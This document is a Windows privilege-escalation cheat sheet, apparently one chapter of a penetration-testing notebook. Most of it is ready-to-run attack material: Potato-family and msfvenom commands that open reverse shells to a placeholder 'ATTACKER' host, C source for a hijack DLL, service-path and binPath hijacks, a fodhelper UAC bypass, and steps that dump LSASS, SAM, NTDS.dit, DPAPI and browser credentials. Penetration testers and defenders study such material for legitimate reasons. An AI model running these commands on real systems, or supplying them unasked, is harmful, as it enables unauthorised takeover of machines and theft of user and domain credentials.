# 33 — Windows Privilege Escalation

From low-priv user to `SYSTEM` (or to a more privileged user). Order: **enum first**, then exploit. Many Windows hosts have multiple paths — pick the cleanest.

## Contents

- [Initial recon](#initial-recon)
- [Automated enumeration](#automated-enumeration)
- [Exploit by privilege token](#exploit-by-privilege-token)
- [Potato family — `SeImpersonatePrivilege` → SYSTEM](#potato-family-seimpersonateprivilege-system)
- [Service abuse](#service-abuse)
- [DLL hijacking](#dll-hijacking)
- [AlwaysInstallElevated](#alwaysinstallelevated)
- [UAC bypasses](#uac-bypasses)
- [Stored credentials](#stored-credentials)
- [LSASS / SAM / SYSTEM dump](#lsass-sam-system-dump)
- [Scheduled tasks](#scheduled-tasks)
- [Registry autoruns](#registry-autoruns)
- [AlwaysInstallElevated, AutoLogon, AdminApprovalMode](#alwaysinstallelevated-autologon-adminapprovalmode)
- [Kernel / OS-level exploits](#kernel-os-level-exploits)
- [Print Nightmare quick path](#print-nightmare-quick-path)
- [SeBackupPrivilege → DCSync (when on a DC) / SAM read](#sebackupprivilege-dcsync-when-on-a-dc-sam-read)
- [Hot Potato (older Windows ≤8 / Server 2012 R2)](#hot-potato-older-windows-8-server-2012-r2)
- ["What if I'm a service account on a server that joined a domain?"](#what-if-im-a-service-account-on-a-server-that-joined-a-domain)
- [Pulling everything together](#pulling-everything-together)
- [Sources](#sources)

## Initial recon

```cmd
whoami /all
whoami /priv
whoami /groups
hostname
systeminfo
wmic qfe list brief
ver
echo %USERPROFILE%
echo %PATH%
net user
net localgroup
net localgroup administrators
```

```powershell
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
Get-CimInstance Win32_OperatingSystem | Select Caption, Version, BuildNumber, OSArchitecture
Get-HotFix | Sort InstalledOn -Descending | Select -First 10
[System.Environment]::OSVersion
```

## Automated enumeration

```cmd
:: winPEAS (Windows version of linpeas)
winPEASx64.exe quiet windowscreds applicationsinfo

:: Or PowerShell port
. .\winPEAS.ps1; Invoke-winPEAS

:: Sherlock / Watson / Seatbelt — focused enum
Sherlock.ps1                         :: missing patches → kernel exploit map
Watson.exe                           :: same, .NET-aware
Seatbelt.exe -group=user              :: situational awareness, lots of categories

:: PowerUp.ps1 — privesc-focused enumeration with auto-exploit hints
. .\PowerUp.ps1; Invoke-AllChecks
```

`accesschk.exe` from Sysinternals is the swiss-army knife for ACL questions:

```cmd
accesschk.exe -accepteula -uwcqv "Authenticated Users" *
accesschk.exe -uws "Everyone" "C:\Program Files"
```

## Exploit by privilege token

`whoami /priv` lists token privileges your process holds. Some are direct paths to SYSTEM.

| Privilege | Direct exploit |
|---|---|
| `SeImpersonatePrivilege` | Potato family (JuicyPotato/PrintSpoofer/RoguePotato/GodPotato/EfsPotato) |
| `SeAssignPrimaryTokenPrivilege` | Same as above (token assignment) |
| `SeBackupPrivilege` | Read SAM/SYSTEM hives → offline NTLM hash → PtH or crack |
| `SeRestorePrivilege` | Write protected files (replace service binary, drop SUID-equiv) |
| `SeTakeOwnershipPrivilege` | Take ownership of any file → grant yourself full control |
| `SeDebugPrivilege` | LSASS dump → credentials |
| `SeManageVolumePrivilege` | (Limited LPE patterns; CVE-specific) |
| `SeLoadDriverPrivilege` | Load malicious driver → kernel code execution |
| `SeTcbPrivilege` | "Act as part of OS" — full SYSTEM-equivalent |

Most useful in the wild: **SeImpersonatePrivilege** and **SeBackupPrivilege**.

## Potato family — `SeImpersonatePrivilege` → SYSTEM

Default for every IIS / MSSQL / WSUS / AD-CS service account. If your shell shows `SeImpersonate` enabled, you can almost always get SYSTEM.

| Tool | Works on |
|---|---|
| **JuicyPotato** | Old Windows Server 2012 R2 / 10 ≤1803 (DCOM ports 6666 reachable) |
| **RoguePotato** | Windows ≥1809 (uses an OXID resolver redirect) |
| **PrintSpoofer** | Windows 10 / Server 2019+ (via Print Spooler IPC) |
| **GodPotato** | Modern Windows + Server 2019/2022 (RPC + DCOM) |
| **EfsPotato / SharpEfsPotato** | Modern Windows (MS-EFSR) |
| **SigmaPotato** | Modern Windows (.NET-driven) |

```cmd
:: PrintSpoofer (most reliable on modern Windows when Spooler runs)
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "C:\Temp\nc.exe ATTACKER 4444 -e cmd"

:: GodPotato (works when Spooler is disabled)
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "cmd /c C:\Temp\rev.exe"

:: RoguePotato
RoguePotato.exe -r ATTACKER -e "C:\Temp\rev.exe" -l 9999
```

`SeImpersonatePrivilege` is also obtainable via service-account-as-user pivots; if you compromise a service account elsewhere, `runas /netonly` to it from your workstation, then connect back and run a Potato.

## Service abuse

### Unquoted service path

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

If a service binary path contains spaces and is not wrapped in quotes (`C:\Program Files\My App\service.exe`), Windows tries each prefix as a binary:

```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My App\service.exe
```

Drop a binary at the first writable prefix.

```cmd
icacls "C:\Program Files\My App"
icacls "C:\Program Files"
```

If `C:\` is writable for your user (it is on some old setups), drop `Program.exe`:

```cmd
copy C:\Temp\rev.exe "C:\Program.exe"
sc start "Vulnerable Service"
```

### Weak service ACLs (`SERVICE_CHANGE_CONFIG`)

```cmd
accesschk.exe -uwcqv "Authenticated Users" *
:: or with a specific user:
accesschk.exe -uwcqv user *
```

If you can change a service's `binPath`:

```cmd
sc qc <svc>
sc config <svc> binpath= "cmd /c C:\Temp\rev.exe"
sc stop <svc>
sc start <svc>
```

Restore the original `binPath` after exploitation.

### Writable service binary

```cmd
icacls "C:\path\to\service.exe"
```

Replace it with a backdoor and restart the service. PowerUp will tell you exactly which services are vulnerable.

## DLL hijacking

A program loads `xyz.dll` without an absolute path; loader walks the search order, picks up the first match.

```
1. Application directory
2. C:\Windows\System32
3. C:\Windows\System
4. C:\Windows
5. Current working directory
6. PATH
```

Drop a malicious `xyz.dll` into a writable directory earlier in the search than the legitimate one. Procmon (Sysinternals) with a filter on `Path ends with .dll AND Result = NAME NOT FOUND` finds candidates.

Build a "DLL with DllMain → spawn cmd":

```c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID p) {
  if (r == DLL_PROCESS_ATTACH) WinExec("cmd /c C:\\Temp\\rev.exe", 0);
  return TRUE;
}
```

```cmd
x86_64-w64-mingw32-gcc -shared -o xyz.dll xyz.c
```

## AlwaysInstallElevated

Two registry values that, when both `1`, let any user install MSI packages as SYSTEM:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If both return `0x1`:

```cmd
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i C:\Temp\evil.msi
```

## UAC bypasses

Useful when you have a Medium-IL admin token and need a High-IL one (ie. you're "admin" but UAC is in the way).

| Technique | Mechanism |
|---|---|
| `fodhelper.exe` | Auto-elevated; checks HKCU registry shell command |
| `eventvwr.exe` | Same idea via mscfile/shell |
| `sdclt.exe` | Same idea |
| `ICMLuaUtil` COM | DLL hijack into auto-elevated COM server |
| `slui.exe` | hijack via HKCU\Software\Classes\exefile\shell\open\command |
| `wsreset.exe` | autoElevate, runs HKCU\Software\Classes\AppX...\Shell\open\command |

Quick `fodhelper` example:

```cmd
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /d "cmd /c C:\Temp\rev.exe" /f
fodhelper.exe
reg delete "HKCU\Software\Classes\ms-settings" /f
```

`UACME` (https://github.com/hfiref0x/UACME) catalogues 70+ techniques.

UAC bypass != privesc — your token's groups must already include Administrators. For "user → admin" you need a different vector; UAC bypasses only get you "filtered admin → high IL admin".

## Stored credentials

### `cmdkey`

```cmd
cmdkey /list
:: Generic Credential entries with stored passwords can be used via:
runas /savecred /user:DOMAIN\user "powershell.exe"
```

### Windows Credential Manager / DPAPI

```powershell
# Enumerate stored vaults / creds
Get-ChildItem "$env:APPDATA\Microsoft\Credentials" -Force
Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Credentials" -Force

# Use mimikatz / SharpDPAPI
mimikatz # dpapi::cred /in:"%APPDATA%\Microsoft\Credentials\<file>"
SharpDPAPI.exe credentials
```

### Browser saved passwords

Chromium-based browsers store credentials in SQLite + DPAPI:

```
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data
```

```powershell
SharpChrome.exe logins
```

### Common config files with creds

```cmd
findstr /S /I "password" *.config *.xml *.ini *.txt *.bat *.ps1 2>nul
findstr /S /I /M "password" C:\Users\Public\*
findstr /S /I "Password" C:\Windows\Panther\Unattend.xml
findstr /S /I "Password" C:\Windows\Panther\Unattend\Unattended.xml
findstr /S /I "Password" C:\Windows\System32\sysprep\sysprep.xml
findstr /S /I "Password" C:\inetpub\wwwroot\web.config
```

```powershell
# Hunt secrets across the disk (slow on big drives)
Get-ChildItem -Recurse -Force -Include *.config,*.xml,*.ps1,*.bat,*.txt,*.ini -EA SilentlyContinue |
  Select-String -Pattern "password=","secret=","apikey=","Bearer " -List | Select Path
```

### Putty / WinSCP / FileZilla / VNC

```cmd
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s        :: Putty saved sessions (UserName, Hostname)
reg query HKCU\Software\Martin Prikryl\WinSCP 2\Sessions /s   :: WinSCP (passwords are obfuscated, recoverable)
type "%APPDATA%\FileZilla\sitemanager.xml"                    :: FileZilla
:: VNC password key is constant: 0xE84AD660C4721AE0
```

### Unattended-install leftovers

```
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend\Autounattend.xml
C:\Windows\System32\sysprep\sysprep.xml
C:\Windows\debug\NetSetup.log
C:\inetpub\wwwroot\web.config
```

The `Password` element is base64; a one-liner decodes it:

```powershell
[Convert]::FromBase64String("V2Vsc...") | ForEach-Object { [char]$_ }
```

## LSASS / SAM / SYSTEM dump

```cmd
:: Dump the registry hives (admin / SYSTEM)
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY

:: LSASS
procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp

:: Or via Task Manager: right-click lsass → Create dump file (admin GUI)
```

Then offline:

```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
pypykatz lsa minidump lsass.dmp
```

LSA Protected Process (`RunAsPPL`) blocks plain `procdump`. Bypasses (only with authorization):

- `mimikatz # !+` driver to disable PPL.
- Comsvcs.dll trick:

```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass-pid> C:\Temp\lsass.dmp full
```

- Defender flags most of these; bring a custom dumper or use `pypykatz`-friendly minidump variants.

## Scheduled tasks

```cmd
schtasks /query /fo LIST /v
schtasks /query /tn "task-name" /xml > task.xml
```

Look for tasks running as a different user where the script is writable by you. Trigger via `schtasks /run /tn name`.

## Registry autoruns

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
```

Writable autoruns can hijack other users' sessions when they log in.

## AlwaysInstallElevated, AutoLogon, AdminApprovalMode

```cmd
:: Auto-logon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr "DefaultUserName DefaultPassword AutoAdminLogon"
```

If `AutoAdminLogon=1` and `DefaultPassword` is set, you have plaintext creds for the configured user.

## Kernel / OS-level exploits

`systeminfo` + `wmic qfe list` shows installed patches. Cross-reference with **Watson** or `Sherlock.ps1`.

Common modern paths:

| CVE | Name | Note |
|---|---|---|
| CVE-2021-1675 / CVE-2021-34527 | PrintNightmare | Print Spooler RCE/LPE |
| CVE-2021-36934 | HiveNightmare / SeriousSAM | Shadow copies + readable SAM |
| CVE-2022-37958 | ALPC LPE | Less reliable |
| CVE-2024-26229 | CSC service LPE | Modern, reliable on patched-old hosts |

For old Windows 7/2008/2012:
- MS16-032, MS16-075, MS17-017 — classic kernel exploits.

`sherlock.ps1` lists candidates with one-liner. Don't run kernel-level exploits without authorization.

## Print Nightmare quick path

```powershell
# Check service
Get-Service -Name Spooler

# Local exploit (CVE-2021-34527)
Invoke-Nightmare -NewUser hacker -NewPassword Pass1
```

If Spooler is stopped or disabled, this won't work.

## SeBackupPrivilege → DCSync (when on a DC) / SAM read

`SeBackupPrivilege` lets you open files that ignore DACLs. Combined with `SeRestorePrivilege` you can write them too.

```cmd
:: Open SAM via robocopy with /B (backup mode)
robocopy /B C:\Windows\System32\config C:\Temp SAM SYSTEM
```

Then offline `secretsdump`.

On a DC with `SeBackupPrivilege`, you can read `NTDS.dit` and the SYSTEM hive → all domain hashes:

```cmd
robocopy /B C:\Windows\NTDS C:\Temp NTDS.dit
robocopy /B C:\Windows\System32\config C:\Temp SYSTEM
```

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

## Hot Potato (older Windows ≤8 / Server 2012 R2)

NBNS spoofing → WPAD → NTLM relay to local HTTP service → SYSTEM token. Tools: `Tater.ps1`, `RottenPotato`. Mostly obsolete on patched hosts.

## "What if I'm a service account on a server that joined a domain?"

Check `whoami /all`. If you have:

- A computer account context (`COMPUTER$`) — you can request Kerberos tickets as the host.
- A service principal account — try Kerberos delegation paths in [20 AD Attacks](20-active-directory-attacks.md).
- LAPS-managed account hash — `LAPS` / `ms-Mcs-AdmPwd` may be readable somewhere.
- Group `Backup Operators`, `DnsAdmins`, `Server Operators` — escalation paths exist for each.

## Pulling everything together

A typical Windows privesc looks like:

```
1. whoami /all + winPEAS
2. Pick the first definitive finding
   - SeImpersonate? Potato.
   - Unquoted service?  Drop binary.
   - Stored creds?  cmdkey/runas/dpapi.
   - AlwaysInstallElevated?  msiexec.
3. SYSTEM — dump SAM/LSA, look for cached domain creds
4. Reuse credentials laterally (SMB/WinRM/RDP) — see [20 AD Attacks](20-active-directory-attacks.md).
```

## Sources

- HackTricks — Windows privesc: https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/
- ired.team Windows: https://www.ired.team/offensive-security/privilege-escalation
- PEASS-ng (winPEAS): https://github.com/peass-ng/PEASS-ng
- PowerUp (PowerSploit): https://github.com/PowerShellMafia/PowerSploit
- The Potato family: https://github.com/ohpe/juicy-potato, https://github.com/itm4n/PrintSpoofer, https://github.com/BeichenDream/GodPotato
- Sysinternals: https://learn.microsoft.com/en-us/sysinternals/
- UACME: https://github.com/hfiref0x/UACME
- Microsoft Learn: https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
